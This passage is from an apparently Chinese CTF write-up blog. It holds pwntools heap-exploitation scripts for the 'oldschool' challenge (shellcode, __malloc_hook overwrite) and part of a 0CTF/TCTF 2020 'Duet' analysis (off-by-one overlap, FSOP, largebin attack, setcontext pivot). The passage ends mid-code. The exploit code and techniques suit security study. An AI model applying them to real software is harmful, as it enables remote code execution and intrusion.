edit(<span class="number">6</span>, <span class="string">b&quot;\\x00&quot;</span> * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">0x6</span> + p64(<span class="number">0xfbad2887</span> | <span class="number">0x1000</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&quot;\\x00\\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">            p.recv(<span class="number">0x40</span>)</span><br><span class="line">            libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\\x00&quot;</span>)) + <span class="number">0x20</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">            log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            p = remote(<span class="string">&#x27;39.101.184.181&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>) + <span class="string">b&quot;\\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(one_gadget + libc.address) + <span class="string">b&quot;\\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h3><p><code>c</code>文件编译生成的二进制文件的反汇编结果与<code>mmap_edit</code>中的判断不同，导致通过<code>mmap_edit</code>进行前向任意地址读写</p><p>首先通过<code>unsorted bin</code>中残留的地址泄露<code>libc</code>，利用任意地址写改写<code>malloc_hook</code></p><p>发现<code>mmap</code>的地址是具有可执行权限的，<code>malloc_hook</code>指向<code>mmap</code>写的<code>shell code</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./oldschool&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b*0x56555754&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;106.14.214.3&#x27;</span>, <span class="number">2333</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shut</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mmap_allocate</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;you want to start: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mmap_edit</span>(<span class="params">index, value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;7&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Value: &quot;</span>, <span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mmap_delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;8&quot;</span>)</span><br><span class="line"></span><br><span class="line">mmap_start = <span class="number">0xe0000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xd0</span>)</span><br><span class="line"></span><br><span class="line">mmap_allocate(<span class="number">0</span>)</span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line">shell = shell.ljust(<span class="built_in">int</span>((<span class="built_in">len</span>(shell) + <span class="number">4</span>)/<span class="number">4</span>)*<span class="number">4</span>, <span class="string">b&quot;\\x90&quot;</span>)</span><br><span class="line">shell_len = <span class="built_in">len</span>(shell)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; shell_len:</span><br><span class="line">    mmap_edit(index, u32(shell[i:i+<span class="number">4</span>]))</span><br><span class="line">    i += <span class="number">4</span></span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;shell and tcache finished&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x268</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xd0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc.address = u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\\x00&quot;</span>)) - <span class="number">0xa8</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x18</span></span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">malloc_hook_address = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">idx = <span class="built_in">int</span>((malloc_hook_address - mmap_start)/<span class="number">4</span>)</span><br><span class="line">mmap_edit(idx, mmap_start)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020 0CTF/TCTF quals 部分PWN WriteUp</title>
      <link href="/posts/4210172891.html"/>
      <url>/posts/4210172891.html</url>
      
        <content type="html"><![CDATA[<h2 id="Duet"><a href="#Duet" class="headerlink" title="Duet"></a>Duet</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这个题目又是一个<code>PLT</code>表损坏，<code>ida</code>无法分析的题目。修复方法是将<code>.got</code>中的偏移修改为<code>extern</code>的位置，之后<code>ida</code>就会自动识别相应的函数，此时我们将<code>.got</code>中对应的<code>DATA XREF</code>中函数（<code>.plt.sec</code>）的命名更改之后，<code>ida</code>就可以正常的分析函数了。<a href="https://www.lyyl.online/2020/10/02/%E4%B8%80%E7%A7%8D%E4%BF%AE%E5%A4%8DIDA%E5%9C%A8%E5%88%86%E6%9E%90Binary%E6%96%87%E4%BB%B6%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84PLT%E8%A1%A8%E6%8D%9F%E5%9D%8F%E6%8A%A5%E9%94%99%E7%9A%84%E6%96%B9%E6%B3%95/">具体的修复方法点这</a>。</p><p>程序一共提供了四种功能<code>add, delete, show, edit</code>。存储两个堆块指针，可分配的堆块的大小为<code>0x80-0x400</code>。只能使用一次<code>edit</code>，并且在该函数中存在一个<code>off-by-one</code>的漏洞。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp/Untitled.png" alt="2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp%20b6f5a2be70dd429dbfc595d0e170347f/Untitled.png"></p><p>同时设置了<code>sandbox</code></p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp/Untitled%201.png" alt="2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp%20b6f5a2be70dd429dbfc595d0e170347f/Untitled%201.png"></p><p>只能通过<code>orw</code>进行，因此我们需要执行<code>ropchain</code>。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul><li>利用<code>off-by-one</code>我们可以进行<code>overlap</code>，泄露出<code>libc</code>基址。</li><li>接下来就是<code>FSOP</code>的利用了。</li></ul><p><code>libc2.24</code>之后的版本中增加了对<code>vtable</code>的检查，而<code>libc2.29</code>相对<code>libc2.27</code>之前的<code>IO_strfile</code>来说，其分配和释放内存的函数都被修改为了标准的<code>malloc,free</code>函数，因此没有办法直接<code>getshell</code></p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp/Untitled%202.png" alt="2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp%20b6f5a2be70dd429dbfc595d0e170347f/Untitled%202.png"></p><h3 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h3><p><a href="https://kirin-say.top/2020/06/29/0CTF-TCTF-2020-Quals-PWN/">0CTF/TCTF 2020 Quals PWN</a></p><p>直接覆写<code>io_list_all</code>或者<code>stderr-&gt;chain</code>。伪造<code>io_file</code>链表，利用<code>_io_str_overflow</code>函数中的<code>malloc</code>和<code>memcpy</code>函数实现任意写。看一下源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *new_buf;</span><br><span class="line">  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">      <span class="built_in">free</span> (old_buf);</span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意到这里会申请一个<code>new_size=2 * old_blen + 100</code>大小的<code>new_buf</code>，并执行<code>memcpy (new_buf, old_buf, old_blen);</code>操作，这里的<code>old_blen</code>的计算方式是<code>#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</code>，也就是说如果我们控制了<code>IO_FILE</code>结构体，并伪造<code>_IO_buf_end</code>和<code>_IO_buf_base</code>就可以申请任意大小的堆块，如果提前布置好堆布局，就可以分配到任意的内存地址，利用<code>memcpy</code>执行任意地址写。需要绕过几个条件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> ((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   ) <span class="comment">//执行IO_OVERFLOW</span></span><br><span class="line"><span class="number">2.</span> (fp-&gt;_flags &amp; _IO_NO_WRITES) == FALSE</span><br><span class="line"><span class="comment">// _IO_blen (fp): ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)`</span></span><br><span class="line"><span class="number">3.</span> (fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt; (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</span><br><span class="line"><span class="number">4.</span> fp-&gt;_IO_buf_base != <span class="literal">NULL</span> <span class="comment">//当然这也是进行memcpy的地址</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我们可以覆写<code>__malloc_hook/free_hook</code>地址，但是我们只能采用<code>orw</code>，可以采用<code>setcontext</code>进行栈迁移，但是<code>setcontext+53</code>的地址之后我们还需要控制<code>rdi</code>，来控制传入<code>setcontext</code>函数的参数。注意到<code>IO_str_overflow</code>中的</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp/Untitled%203.png" alt="2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp%20b6f5a2be70dd429dbfc595d0e170347f/Untitled%203.png"></p><p>此时<code>rdi</code>的值为<code>io_file</code>结构体的起始地址，因此我们可以通过伪造的<code>IO_FILE</code>结构体控制<code>rdi</code>的值。因此可以覆写<code>__malloc_hook</code>的地址为<code>setcontext+53</code>的位置，在下一个<code>IO_FILE</code>结构体中控制<code>rdi</code>的值进行栈迁移。最终执行<code>ropchain</code></p><ul><li>利用<code>overlap</code>泄露<code>libc</code>基址</li><li>伪造<code>large bin</code>，并覆写<code>tcache-&gt;fd</code>为<code>_malloc_hook</code>地址，分配两次即可得到<code>_malloc_hook</code>指向的内存</li><li>利用<code>large bin attack</code>覆写<code>stderr-&gt;chain</code>为控制的堆地址</li><li>在堆内存中伪造三个<code>IO_FILE</code>结构体。第一个消耗<code>tcache</code>的第一个堆块，第二个申请得到<code>__malloc_hook</code>所在的内存，覆写为<code>setcontext+53</code>地址，第三个则控制<code>rdi</code>，调用<code>setcontext</code>进行栈迁移，指向<code>ropchain</code></li></ul><p>首先先泄露<code>libc</code>基址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x1e0</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x108</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x3f8</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x400</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0xf8</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x178</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *0x555555555BC7&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xf0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0xf1</span>) <span class="comment"># overlap</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x178</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0xe8</span> + p64(<span class="number">0x91</span>))</span><br><span class="line">delete(<span class="number">1</span>)  <span class="comment"># 0x1f0 chunk , +0x100 is 0x180 chunk</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x108</span>, <span class="string">b&quot;\\x00&quot;</span> * <span class="number">0xf8</span> + p64(<span class="number">0x91</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x10</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\\x00&quot;</span>)) - <span class="number">96</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时我们进行完成了<code>overlap</code>，通过<code>0x1f0</code>的堆块可以控制<code>0x180</code>堆块的堆头数据。之后可以利用<code>largebin attack</code>改写<code>stderr-&gt;chain</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x308</span>, <span class="string">b&quot;\\x00&quot;</span> * (<span class="number">0x278</span>) + p64(<span class="number">0x310</span> - <span class="number">0x280</span> + <span class="number">1</span>))<span class="comment"># padding, fake 0x400 chunk fd</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x1e8</span>, <span class="string">b&quot;\\x00&quot;</span> * <span class="number">0xf8</span> + p64(<span class="number">0x401</span>) + p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span> + <span class="number">96</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) * <span class="number">27</span>)</span><br><span class="line">delete(<span class="number">0</span>)  <span class="comment"># 0x400 chunk in unsorted bin</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x3f8</span>, (<span class="string">b&quot;\\x00&quot;</span> * <span class="number">0xe8</span> + p64(<span class="number">0x91</span>)).ljust(<span class="number">0x178</span>, <span class="string">b&quot;\\x00&quot;</span>) + p64(<span class="number">0x311</span>) + p64(libc.sym[<span 